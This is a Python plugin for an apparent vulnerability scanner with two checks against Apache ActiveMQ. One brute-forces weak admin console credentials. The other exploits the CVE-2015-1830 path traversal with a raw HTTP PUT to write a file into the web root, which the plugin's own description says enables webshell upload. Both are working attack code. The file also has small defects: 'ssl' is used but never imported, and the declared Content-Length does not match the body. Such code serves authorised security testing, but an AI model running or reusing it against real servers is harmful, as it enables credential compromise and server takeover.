#!/usr/bin/env python3
# encoding=utf-8
#codeby     道长且阻
#email      @ydhcui/QQ664284092

from core.plugin import BaseWebPlugin,BaseHostPlugin,brute

import requests
import base64
import socket

class ActiveMQ_noauth(BaseWebPlugin):
    bugname = "ActiveMQ弱口令"
    bugrank = "高危"
    bugdesc = "攻击者通过此漏洞可以登陆管理控制台，甚至能够获取GetShell。"

    def filter(self,web):
        return web.port == 8161 or 'activemq' in web.content

    @brute
    def verify(self,web, user='admin', pwd='',timeout=10):
        url = "%s://%s" % (web.scheme, web.netloc)
        base64string = base64.b64encode(('%s:%s'%(user, pwd)).encode()).decode()
        authheader = "Basic %s" % base64string
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0',
            'Referer': url,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'cn-ZH,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Authorization': authheader}
        url = url + '/admin/'
        req = requests.get(url, headers=headers,timeout=timeout)
        if 'ActiveMQ Console' in req.text:
            self.bugaddr = url
            self.bugreq = '%s/admin/, 账号：%s, 密码：%s' % (url, user, pwd)
            self.bugres = req.text
            return True

class ActiveMQ_unauthenticated_RCE(BaseWebPlugin):
    bugname = "ActiveMQ任意文件上传"
    bugrank = "高危"
    bugdesc = "攻击者通过此漏洞可直接上传webshell，进而入侵控制服务器。"
    bugnumber = "CVE-2015-1830"
    bugnote = "http://cve.scap.org.cn/CVE-2015-1830.html"

    def filter(self,web):
        return 'activemq' in web.content

    def verify(self,web, user='admin', pwd='',timeout=10):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if "https" in web.scheme:
            s = ssl.wrap_socket(s)
        s.settimeout(timeout)
        try:
            s.connect((web.host, web.port))
            filename = "ActiveMQUploadTest.txt"
            flag = "PUT /fileserver/sex../../..\\styles/%s HTTP/1.0\r\nContent-Length: 9\r\n\r\nupload-test\r\n\r\n"%(filename)
            s.send(flag.encode())
            data = s.recv(1024)
            url = 'http://' + web.host + ":" + str(web.port) + '/styles/%s'%(filename)
            req = requests.get(url)
            if req.status_code == 200 and 'upload-test' in req.text:
                self.bugaddr = "http://%s:%s"%(web.host,web.port)
                self.bugreq = flag
                self.bugres = str(data)
                return True
        except Exception as e:
            print(e)
        finally:
            s.close()